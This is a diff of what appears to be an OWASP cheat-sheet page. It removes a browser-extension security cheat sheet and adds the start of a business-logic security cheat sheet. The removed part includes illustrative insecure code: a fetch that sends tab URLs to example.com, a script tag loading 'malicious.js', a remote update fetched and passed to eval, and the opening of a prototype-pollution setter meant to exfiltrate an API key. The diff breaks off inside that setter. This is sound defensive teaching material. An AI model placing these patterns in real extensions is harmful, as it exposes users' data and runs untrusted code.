+  <a href="#what-to-log" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Lack of Content Security Policy (CSP)
+      What to Log
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-lack-of-content-security-policy-csp" class="md-nav__link">
+  <a href="#what-to-alert-on" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Lack of Content Security Policy (CSP)
+      What to Alert On
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-lack-of-content-security-policy-csp" class="md-nav__link">
+  <a href="#close-the-loop" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Lack of Content Security Policy (CSP)
+      Close the Loop
     </span>
   </a>
   
@@ -3767,37 +3749,46 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#9-insecure-storage" class="md-nav__link">
+  <a href="#testing-business-logic" class="md-nav__link">
     <span class="md-ellipsis">
-      9. Insecure Storage
+      Testing Business Logic
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="9. Insecure Storage">
+    <nav class="md-nav" aria-label="Testing Business Logic">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-insecure-storage" class="md-nav__link">
+  <a href="#test-the-rules-not-the-implementation" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Insecure Storage
+      Test the Rules, Not the Implementation
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-insecure-storage" class="md-nav__link">
+  <a href="#test-concurrency" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Insecure Storage
+      Test Concurrency
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-insecure-storage" class="md-nav__link">
+  <a href="#test-ordering" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Insecure Storage
+      Test Ordering
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#test-with-an-adversarial-mindset" class="md-nav__link">
+    <span class="md-ellipsis">
+      Test with an Adversarial Mindset
     </span>
   </a>
   
@@ -3809,37 +3800,55 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#10-insufficient-privacy-controls" class="md-nav__link">
+  <a href="#common-examples-of-business-logic-flaws" class="md-nav__link">
     <span class="md-ellipsis">
-      10. Insufficient Privacy Controls
+      Common Examples of Business Logic Flaws
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="10. Insufficient Privacy Controls">
+    <nav class="md-nav" aria-label="Common Examples of Business Logic Flaws">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vulnerability-insufficient-privacy-controls" class="md-nav__link">
+  <a href="#price-and-quantity" class="md-nav__link">
     <span class="md-ellipsis">
-      Vulnerability: Insufficient Privacy Controls
+      Price and Quantity
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#example-insufficient-privacy-controls" class="md-nav__link">
+  <a href="#workflow" class="md-nav__link">
     <span class="md-ellipsis">
-      Example: Insufficient Privacy Controls
+      Workflow
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#mitigation-insufficient-privacy-controls" class="md-nav__link">
+  <a href="#concurrency" class="md-nav__link">
     <span class="md-ellipsis">
-      Mitigation: Insufficient Privacy Controls
+      Concurrency
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authorization-in-disguise" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authorization-in-disguise
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#value-dispensing-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      Value-dispensing Abuse
     </span>
   </a>
   
@@ -3851,135 +3860,18 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#11-dom-based-data-skimming" class="md-nav__link">
+  <a href="#summary-checklist" class="md-nav__link">
     <span class="md-ellipsis">
-      11. DOM-based Data Skimming
+      Summary Checklist
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="11. DOM-based Data Skimming">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vulnerability-dom-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Vulnerability: DOM-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#example-dom-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Example: DOM-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#mitigation-dom-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation: DOM-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#12-prototype-based-data-skimming" class="md-nav__link">
+  <a href="#references" class="md-nav__link">
     <span class="md-ellipsis">
-      12. Prototype-based Data Skimming
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="12. Prototype-based Data Skimming">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vulnerability-prototype-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Vulnerability: Prototype-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#example-prototype-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Example: Prototype-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#mitigation-prototype-based-data-skimming" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation: Prototype-based Data Skimming
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#13-insecure-message-passing" class="md-nav__link">
-    <span class="md-ellipsis">
-      13. Insecure Message Passing
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="13. Insecure Message Passing">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vulnerability-insecure-message-passing" class="md-nav__link">
-    <span class="md-ellipsis">
-      Vulnerability: Insecure Message Passing
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#example-insecure-message-passing" class="md-nav__link">
-    <span class="md-ellipsis">
-      Example: Insecure Message Passing
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#mitigation-insecure-message-passing" class="md-nav__link">
-    <span class="md-ellipsis">
-      Mitigation: Insecure Message Passing
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      Conclusion
+      References
     </span>
   </a>
   
@@ -4003,223 +3895,315 @@
   
 
 
-<h1 id="browser-extension-security-vulnerabilities-cheat-sheet">Browser Extension Security Vulnerabilities Cheat Sheet<a class="headerlink" href="#browser-extension-security-vulnerabilities-cheat-sheet" title="Permanent link">&para;</a></h1>
-<h2 id="1-permissions-overreach">1. Permissions Overreach<a class="headerlink" href="#1-permissions-overreach" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-permissions-overreach">Vulnerability: Permissions Overreach<a class="headerlink" href="#vulnerability-permissions-overreach" title="Permanent link">&para;</a></h3>
-<p>Browser extensions sometimes request more permissions than they actually need. This can grant them access to all tabs, browsing history, and even sensitive user data. If an extension is compromised, it could lead to serious privacy risks.</p>
-<h3 id="example-permissions-overreach">Example: Permissions Overreach<a class="headerlink" href="#example-permissions-overreach" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;manifest_version&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Extension&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="s2">&quot;tabs&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="s2">&quot;http://*/*&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="s2">&quot;https://*/*&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="s2">&quot;storage&quot;</span>
-<span class="w">  </span><span class="p">]</span>
-<span class="p">}</span>
-</code></pre></div>
-<h3 id="mitigation-permissions-overreach">Mitigation: Permissions Overreach<a class="headerlink" href="#mitigation-permissions-overreach" title="Permanent link">&para;</a></h3>
-<p>Follow the Principle of Least Privilege (PoLP) and request only the permissions that are absolutely necessary. Use optional permissions whenever possible instead of granting full access upfront. Regularly audit and remove any permissions that are no longer needed.</p>
-<h2 id="2-data-leakage">2. Data Leakage<a class="headerlink" href="#2-data-leakage" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-data-leakage">Vulnerability: Data Leakage<a class="headerlink" href="#vulnerability-data-leakage" title="Permanent link">&para;</a></h3>
-<p>Some extensions unintentionally expose user data by sending browsing activity or personal details to external servers without proper security measures.</p>
-<h3 id="example-data-leakage">Example: Data Leakage<a class="headerlink" href="#example-data-leakage" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nx">onUpdated</span><span class="p">.</span><span class="nx">addListener</span><span class="p">((</span><span class="nx">tabId</span><span class="p">,</span><span class="w"> </span><span class="nx">changeInfo</span><span class="p">,</span><span class="w"> </span><span class="nx">tab</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">changeInfo</span><span class="p">.</span><span class="nx">status</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;complete&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://example.com/track&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
-<span class="w">      </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">URL</span><span class="o">:</span><span class="w"> </span><span class="nx">tab</span><span class="p">.</span><span class="nx">URL</span><span class="w"> </span><span class="p">})</span>
-<span class="w">    </span><span class="p">});</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">});</span>
-</code></pre></div>
-<h3 id="mitigation-data-leakage">Mitigation: Data Leakage<a class="headerlink" href="#mitigation-data-leakage" title="Permanent link">&para;</a></h3>
-<p>Always use HTTPS for all communications to prevent data interception. Limit data collection and be transparent by clearly stating what data is collected in a Privacy Policy.Implement user consent mechanisms before collecting or sending any personal data.</p>
-<h2 id="3-cross-site-scripting-xss">3. Cross-Site Scripting (XSS)<a class="headerlink" href="#3-cross-site-scripting-xss" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-cross-site-scripting-xss">Vulnerability: Cross-Site Scripting (XSS)<a class="headerlink" href="#vulnerability-cross-site-scripting-xss" title="Permanent link">&para;</a></h3>
-<p>If user input is not properly sanitized, attackers can inject malicious scripts into web pages, potentially stealing user data or performing unauthorized actions.</p>
-<h3 id="example-cross-site-scripting-xss">Example: Cross-Site Scripting (XSS)<a class="headerlink" href="#example-cross-site-scripting-xss" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">userInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">userInput</span><span class="p">;</span><span class="w"> </span><span class="c1">// No sanitization</span>
-</code></pre></div>
-<h3 id="mitigation-cross-site-scripting-xss">Mitigation: Cross-Site Scripting (XSS)<a class="headerlink" href="#mitigation-cross-site-scripting-xss" title="Permanent link">&para;</a></h3>
-<p>Implement Content Security Policy (CSP) to block inline scripts. Use libraries like DOMPurify to sanitize user input before displaying it. Avoid using innerHTML and instead use textContent to prevent execution of injected scripts.</p>
-<h2 id="4-insecure-communication">4. Insecure Communication<a class="headerlink" href="#4-insecure-communication" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-insecure-communication">Vulnerability: Insecure Communication<a class="headerlink" href="#vulnerability-insecure-communication" title="Permanent link">&para;</a></h3>
-<p>Some extensions send sensitive data over unsecured HTTP connections, making it vulnerable to interception by attackers.</p>
-<h3 id="example-insecure-communication">Example: Insecure Communication<a class="headerlink" href="#example-insecure-communication" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://example.com/api/data&#39;</span><span class="p">);</span>
-</code></pre></div>
-<h3 id="mitigation-insecure-communication">Mitigation: Insecure Communication<a class="headerlink" href="#mitigation-insecure-communication" title="Permanent link">&para;</a></h3>
-<p>Always use HTTPS for external communications to prevent data theft. Validate server responses before processing them to ensure data integrity.</p>
-<h2 id="5-code-injection">5. Code Injection<a class="headerlink" href="#5-code-injection" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-code-injection">Vulnerability: Code Injection<a class="headerlink" href="#vulnerability-code-injection" title="Permanent link">&para;</a></h3>
-<p>An extension that dynamically loads scripts from an untrusted source can be exploited to inject and execute malicious code.</p>
-<h3 id="example-code-injection">Example: Code Injection<a class="headerlink" href="#example-code-injection" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
-<span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://example.com/malicious.js&#39;</span><span class="p">;</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
-</code></pre></div>
-<h3 id="mitigation-code-injection">Mitigation: Code Injection<a class="headerlink" href="#mitigation-code-injection" title="Permanent link">&para;</a></h3>
-<p>Use CSP (Content Security Policy) to restrict script sources. For more details, refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">CSP Cheat Sheet</a>. Avoid using eval() and innerHTML as they can execute malicious code. Prefer using extension messaging APIs instead of injecting scripts into web pages.</p>
-<h2 id="6-malicious-updates">6. Malicious Updates<a class="headerlink" href="#6-malicious-updates" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-malicious-updates">Vulnerability: Malicious Updates<a class="headerlink" href="#vulnerability-malicious-updates" title="Permanent link">&para;</a></h3>
-<p>If an extension fetches updates from an untrusted server, an attacker could push malicious updates to all users.</p>
-<h3 id="example-malicious-updates">Example: Malicious Updates<a class="headerlink" href="#example-malicious-updates" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onInstalled</span><span class="p">.</span><span class="nx">addListener</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://example.com/update-script.js&#39;</span><span class="p">)</span>
-<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
-<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nb">eval</span><span class="p">);</span><span class="w"> </span><span class="c1">// Unsafe!</span>
-<span class="p">});</span>
-</code></pre></div>
-<h3 id="mitigation-malicious-updates">Mitigation: Malicious Updates<a class="headerlink" href="#mitigation-malicious-updates" title="Permanent link">&para;</a></h3>
-<p>Sign extension updates with digital signatures to ensure authenticity. Instead of fetching updates within the extension, rely on updates from the extension marketplace.
-See <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices">"Don’t inject or incorporate remote scripts"</a>.
-Implement integrity checks before executing any fetched code.</p>
-<h2 id="7-third-party-dependencies">7. Third-Party Dependencies<a class="headerlink" href="#7-third-party-dependencies" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-third-party-dependencies">Vulnerability: Third-Party Dependencies<a class="headerlink" href="#vulnerability-third-party-dependencies" title="Permanent link">&para;</a></h3>
-<p>Using outdated or vulnerable third-party libraries in an extension can introduce security risks if those libraries have known exploits.</p>
-<h3 id="example-third-party-dependencies">Example: Third-Party Dependencies<a class="headerlink" href="#example-third-party-dependencies" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;dependencies&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;vulnerable-lib&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1.0.0&quot;</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-<h3 id="mitigation-third-party-dependencies">Mitigation: Third-Party Dependencies<a class="headerlink" href="#mitigation-third-party-dependencies" title="Permanent link">&para;</a></h3>
-<p>Regularly audit third-party dependencies for security vulnerabilities. Use tools like npm audit or OWASP Dependency-Check to detect risks.Prefer actively maintained libraries with frequent security updates.</p>
-<h2 id="8-lack-of-content-security-policy-csp">8. Lack of Content Security Policy (CSP)<a class="headerlink" href="#8-lack-of-content-security-policy-csp" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-lack-of-content-security-policy-csp">Vulnerability: Lack of Content Security Policy (CSP)<a class="headerlink" href="#vulnerability-lack-of-content-security-policy-csp" title="Permanent link">&para;</a></h3>
-<p>Without a strict CSP, attackers can inject scripts into an extension’s web pages, increasing the risk of cross-site scripting (XSS) attacks.</p>
-<h3 id="example-lack-of-content-security-policy-csp">Example: Lack of Content Security Policy (CSP)<a class="headerlink" href="#example-lack-of-content-security-policy-csp" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;manifest_version&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Extension&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;content_security_policy&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;default-src &#39;self&#39;&quot;</span>
-<span class="p">}</span>
-</code></pre></div>
-<h3 id="mitigation-lack-of-content-security-policy-csp">Mitigation: Lack of Content Security Policy (CSP)<a class="headerlink" href="#mitigation-lack-of-content-security-policy-csp" title="Permanent link">&para;</a></h3>
-<p>Define a strict CSP in the extension’s manifest.json file. Use nonce-based or hash-based policies to allow only trusted scripts. Block execution of inline scripts and restrict third-party content sources.</p>
-<h2 id="9-insecure-storage">9. Insecure Storage<a class="headerlink" href="#9-insecure-storage" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-insecure-storage">Vulnerability: Insecure Storage<a class="headerlink" href="#vulnerability-insecure-storage" title="Permanent link">&para;</a></h3>
-<p>Storing sensitive data like authentication tokens in localStorage or other unsecured locations makes it easy for attackers to access.</p>
-<h3 id="example-insecure-storage">Example: Insecure Storage<a class="headerlink" href="#example-insecure-storage" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;my-secret-token&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// No encryption</span>
-</code></pre></div>
-<h3 id="mitigation-insecure-storage">Mitigation: Insecure Storage<a class="headerlink" href="#mitigation-insecure-storage" title="Permanent link">&para;</a></h3>
-<p>Store sensitive data in Chrome Storage API, which provides better security than localStorage.
-Encrypt stored data before saving it locally.
-Never hardcode API keys or credentials within the extension code.</p>
-<h2 id="10-insufficient-privacy-controls">10. Insufficient Privacy Controls<a class="headerlink" href="#10-insufficient-privacy-controls" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-insufficient-privacy-controls">Vulnerability: Insufficient Privacy Controls<a class="headerlink" href="#vulnerability-insufficient-privacy-controls" title="Permanent link">&para;</a></h3>
-<p>If an extension does not clearly define how it collects and handles user data, it could lead to privacy violations and unauthorized data usage.</p>
-<h3 id="example-insufficient-privacy-controls">Example: Insufficient Privacy Controls<a class="headerlink" href="#example-insufficient-privacy-controls" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;manifest_version&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Extension&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;A cool extension with no privacy policy.&quot;</span>
-<span class="p">}</span>
-</code></pre></div>
-<h3 id="mitigation-insufficient-privacy-controls">Mitigation: Insufficient Privacy Controls<a class="headerlink" href="#mitigation-insufficient-privacy-controls" title="Permanent link">&para;</a></h3>
-<p>Implement a clear privacy policy that explains data collection practices. Allow users to opt out of data collection. Disclose data-sharing practices to comply with GDPR, CCPA, and other privacy regulations.</p>
-<h2 id="11-dom-based-data-skimming">11. DOM-based Data Skimming<a class="headerlink" href="#11-dom-based-data-skimming" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-dom-based-data-skimming">Vulnerability: DOM-based Data Skimming<a class="headerlink" href="#vulnerability-dom-based-data-skimming" title="Permanent link">&para;</a></h3>
-<p>When an extension renders sensitive user information directly into DOM of a web page, this data becomes accessible to the page's own scripts.</p>
-<p>This risk applies regardless of the method used, including plain JavaScript DOM manipulation or injecting components built with frameworks like React.</p>
-<p>A malicious or compromised web page can inspect the DOM, read the sensitive data (e.g., personally identifiable information, financial details, AI chat histories), and exfiltrate it.</p>
-<h3 id="example-dom-based-data-skimming">Example: DOM-based Data Skimming<a class="headerlink" href="#example-dom-based-data-skimming" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="c1">// content-script.js</span>
-
-<span class="c1">// Sensitive data fetched from the extension&#39;s background service</span>
-<span class="kd">const</span><span class="w"> </span><span class="nx">userData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;Jane Doe&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nx">email</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;jane.doe@example.com&quot;</span>
-<span class="p">};</span>
-
-<span class="c1">// This injects sensitive data directly into the page&#39;s DOM</span>
-<span class="kd">const</span><span class="w"> </span><span class="nx">userInfoDiv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
-<span class="nx">userInfoDiv</span><span class="p">.</span><span class="nx">innerText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`name: </span><span class="si">${</span><span class="nx">userData</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">, email: </span><span class="si">${</span><span class="nx">userData</span><span class="p">.</span><span class="nx">email</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">userInfoDiv</span><span class="p">);</span>
-</code></pre></div>
-<h3 id="mitigation-dom-based-data-skimming">Mitigation: DOM-based Data Skimming<a class="headerlink" href="#mitigation-dom-based-data-skimming" title="Permanent link">&para;</a></h3>
-<p>Avoid rendering any sensitive information directly into a web page's DOM. Instead, display sensitive data in UI elements that are isolated from the web page's context and controlled by the extension.</p>
-<p>Use secure alternatives such as:</p>
+<h1 id="business-logic-security-cheat-sheet">Business Logic Security Cheat Sheet<a class="headerlink" href="#business-logic-security-cheat-sheet" title="Permanent link">&para;</a></h1>
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<p>Business logic vulnerabilities are flaws in the way an application implements its intended workflow. They aren't missing input sanitization or unescaped output. The code does what the developer told it to do, but what the developer told it to do doesn't match what the business actually needs. A user skips a required step, submits a request out of order, pays a negative price, stacks coupons in a way nobody planned for, or wins a race against the server's own bookkeeping.</p>
+<p>No scanner will find these bugs for you. They don't have a signature to match on. They show up in code that looks perfectly fine in isolation because the bug isn't in any single function. It's in the gap between what the developer assumed and what a user can actually do.</p>
+<p>This cheat sheet covers practical patterns for preventing business logic abuse. It's aimed at developers building features, not at penetration testers looking for them. For testing guidance, see the <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Business_Logic_Testing/">OWASP Web Security Testing Guide, Business Logic Testing section</a>.</p>
+<p>Key takeaways:</p>
 <ul>
-<li>Popup: Display information in a popup UI that appears when the user clicks the extension's icon.</li>
-<li>Options Page: Use a dedicated options page for displaying user-specific data or settings.</li>
-<li>Side Panel: Use the side panel to show a persistent UI in a separate pane, isolated from the page content. (FYI, "Side Panel" is a Chromium term. Firefox calls it "Sidebar".)</li>
+<li>Always re-derive security-relevant values (prices, permissions, ownership) on the server. Client state is input, not truth.</li>
+<li>Enforce workflows as explicit state machines. Don't rely on the UI to gate the order of steps.</li>
+<li>Treat concurrency as a real threat. If two requests can race, assume they will.</li>
+<li>Rate-limit and monitor at the feature level, not just at authentication. Abuse-friendly features (referrals, coupons, password reset) need their own controls.</li>
+<li>Threat model from the business process, not just the technical architecture. Ask what happens if a user acts dishonestly, not just what happens if an attacker sends a malicious payload.</li>
 </ul>
-<p>It is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot"><code>openOrClosedShadowRoot()</code> API</a>.</p>
-<p>Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.</p>
-<h2 id="12-prototype-based-data-skimming">12. Prototype-based Data Skimming<a class="headerlink" href="#12-prototype-based-data-skimming" title="Permanent link">&para;</a></h2>
-<h3 id="vulnerability-prototype-based-data-skimming">Vulnerability: Prototype-based Data Skimming<a class="headerlink" href="#vulnerability-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
-<p>An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a <code>&lt;script&gt;</code> tag directly to DOM with <code>src</code> attribute pointing to a script of <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources">web accessible resources</a>.</p>
-<p>When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.</p>
-<p>The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.</p>
-<p>This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.</p>
-<h3 id="example-prototype-based-data-skimming">Example: Prototype-based Data Skimming<a class="headerlink" href="#example-prototype-based-data-skimming" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="c1">// Malicious script overwriting all objects&#39; setter for &#39;apiKey&#39;</span>
-<span class="c1">// to send the value to be set towards a server.</span>
-<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;apiKey&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
